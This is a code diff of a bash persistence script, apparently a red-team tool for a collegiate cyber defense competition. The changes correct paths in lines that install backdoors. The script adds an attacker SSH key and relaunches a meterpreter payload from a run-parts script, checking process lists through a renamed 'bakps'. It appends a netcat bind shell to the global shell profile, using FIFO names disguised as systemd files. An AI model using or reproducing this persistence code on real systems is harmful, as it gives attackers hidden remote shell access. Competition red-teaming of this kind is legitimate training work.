@@ -175,7 +175,7 @@ WEB_PORT="59001"
 REVERSE_PORT="59002"
 BIND_PORT="60000"
 FIFO_REVERSE="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
-FIFO_BIND="systemd-private-68eb5cd948c03875a3aa64dc96efabaa-upower.service-O6ME4M"
+FIFO_BIND="/tmp/systemd-private-68eb5cd948c03875a3aa64dc96efabaa-upower.service-O6ME4M"
 
 SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDECrcus+R9kJjhjzm4iSvjTvqRUmpJCg1cxi4U1TrPnaUhz+k5utWzrJlJjm/Cn6lmTO75jcYCQwWGKatf2WwZtN5hkMb++d6DHb1KXOGrNdkEbgvA8DBMDkWbR9NUyLzF2enfSwdJqDRNVPWhTGyqUIPaHH5HCEAPmDxQnnojOFhRg5t+ZaxJtQ0GvGBKxIAcl+wn4OyiW7/EpT2dHsZactSZb+az2bWcP01W6UUYq8ttZADFI1+g31UEPd9tGJbkCbCg0jPsb9fGPN0QkIdRf9LMWqMBkLOscyT5VOyawZjsupFjYOiSswfcEvI3hmSc13crFQzR45wXn4IhjCgZ blackteam@wrccdc.org"
 
@@ -194,7 +194,7 @@ CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
 CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"
 RUNPARTS_SCRIPT="#!/usr/bin/env bash
 
-(which \"bakps\" &>/dev/null && ! grep -q \"$NEW_METERPRETER\" <<< \"\$(bakps aux)\" && $NEW_METERPRETER_PATH &) || (! grep -q \"$NEW_METERPRETER\" <<< \"\$(ps aux)\" && $NEW_METERPRETER_PATH &")
+which \"bakps\" &>/dev/null && (! grep -q \"$NEW_METERPRETER\" <<< \"\$(bakps aux)\" && $NEW_METERPRETER_PATH &) || (! grep -q \"$NEW_METERPRETER\" <<< \"\$(ps aux)\" && $NEW_METERPRETER_PATH &)"
 
 # Web delivery meterpreter
 WEB_URI="systemd-clock"
@@ -364,9 +364,9 @@ else
 		cecho log "Netcat bind shell already placed in '$GLOBAL_PROFILE_DIR/$PROFILE_FILE', skipping"
 	else
 		if exists bakcat; then # the backup cat we may have created during the weakening script
-			echo "(setsid sh -c \"rm -f /tmp/$FIFO_BIND-\$(whoami) && mkfifo /tmp/$FIFO_BIND-\$(whoami) && while true; do bakcat /tmp/$FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > /tmp/$FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
+			echo "(setsid sh -c \"rm -f $FIFO_BIND-\$(whoami) && mkfifo $FIFO_BIND-\$(whoami) && while true; do bakcat $FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > $FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
 		else # original cat binary, untouched
-			echo "(setsid sh -c \"rm -f /tmp/$FIFO_BIND-\$(whoami) && mkfifo /tmp/$FIFO_BIND-\$(whoami) && while true; do cat /tmp/$FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > /tmp/$FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
+			echo "(setsid sh -c \"rm -f $FIFO_BIND-\$(whoami) && mkfifo $FIFO_BIND-\$(whoami) && while true; do cat $FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > $FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
 		fi
 	fi
 
